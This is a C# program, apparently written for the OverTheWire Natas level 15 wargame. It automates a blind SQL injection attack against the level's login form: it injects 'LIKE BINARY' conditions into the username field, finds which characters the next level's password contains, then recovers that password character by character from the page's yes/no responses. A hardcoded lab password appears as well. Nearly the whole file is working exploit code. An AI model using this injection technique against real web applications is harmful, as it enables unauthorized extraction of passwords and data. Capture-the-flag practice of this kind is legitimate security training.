using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net;
using System.Timers;
using System.Diagnostics;

namespace bruteforce_natec15
{
    class Program
    {
        static void Main(string[] args)
        {
            Task t = new Task(HttpMethod);
            t.Start();

            Console.ReadLine();
        }

        static async void HttpMethod()
        {
            string allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            string login = "natas15";
            string pass = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J";
            string link = "http://natas15.natas.labs.overthewire.org/index.php?#debug";
            string existChar = "";
            string existChar1 = "acehijmnpqtwBEHINORW03569";
            HttpClientHandler handler = new HttpClientHandler();
            handler.Credentials = new NetworkCredential(login, pass);//stworzenie uchwytu z hasłem
            HttpClient client = new HttpClient(handler);

            Stopwatch time = new Stopwatch();
            time.Start();

            Console.Write("Prosze czekać.");
            for (int i = 0; i < allChars.Length; i++)
            {
                var values = new Dictionary<string, string>
                {
                    { "username", "natas16\" and password LIKE BINARY \"%"+allChars[i]+"%" },

                };

                // 'natas16" and password LIKE BINARY "%' + char + '%" #'}
                //  natas16"AND password LIKE BINARY "%w%&debug
                var content = new FormUrlEncodedContent(values);
                var response = await client.PostAsync(link, content);
                var allContent = await response.Content.ReadAsStringAsync();// wyswietlenie całej zawartości strony
                                                                            //Console.WriteLine("{0}", response);// reasonphrase "ok" znaczy zie login i haslo do strony sa dobre
                                                                            //Console.WriteLine("{0}", allContent);
                                                                            //wyciecie conentu
                int index = allContent.IndexOf("content");
                string contentOnly = allContent.Substring(index);
                index = contentOnly.IndexOf("This");
                contentOnly = contentOnly.Substring(index);
                //Console.WriteLine("{0}", contentOnly);
                if (contentOnly.Contains("This user exist"))
                {
                    //Console.WriteLine("weszlo");
                    existChar += allChars[i];
                }
                //Console.Write(".");
            }

            
            //Console.WriteLine("{0}", );

            Console.WriteLine();
            Console.WriteLine("Exist characters: {0}",existChar);
            string password = "";
            Console.WriteLine("Prosze czekać.");

            //brutforce na podstawie znaków
            for (int i = 0; i < 32; i++)
            {
                for (int j = 0; j < existChar.Length; j++)
                {
                    var values = new Dictionary<string, string>
                    {
                        { "username", "natas16\" and password LIKE BINARY \""+password+existChar[j]+"%" },

                    };
                    var content = new FormUrlEncodedContent(values);
                    var response = await client.PostAsync(link, content);
                    var allContent = await response.Content.ReadAsStringAsync();

                    int index = allContent.IndexOf("content");
                    string contentOnly = allContent.Substring(index);
                    index = contentOnly.IndexOf("This");
                    contentOnly = contentOnly.Substring(index);
                    if (contentOnly.Contains("This user exist"))
                    {
                        //Console.WriteLine("weszlo");
                        password += existChar[j];
                        Console.WriteLine("{0}", password);
                        break;
                    }
                    //Console.Write(".");                   
                }
            }
            Console.WriteLine();
            Console.WriteLine("password: {0}", password);
            time.Stop();
            Console.WriteLine("Czas: {0} ms", time.ElapsedMilliseconds);

            while (true);
        }

    }
}
